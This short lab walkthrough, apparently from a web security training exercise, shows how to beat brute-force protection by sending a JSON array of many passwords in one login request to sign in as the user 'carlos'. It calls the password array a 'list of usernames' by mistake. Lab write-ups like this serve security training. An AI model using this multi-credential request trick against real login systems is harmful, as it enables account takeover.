# Lab: Broken brute-force protection, multiple credentials per request

Navigate to the login page and intercept the login request.

Notice that the data passed in the request is an array.

Replace the password field with the list of usernames:
```
"username": "carlos",
"password" : [
    "123456",
    "password",
    "qwerty"
    ...
]
```

Send the request to login successfully as carlos.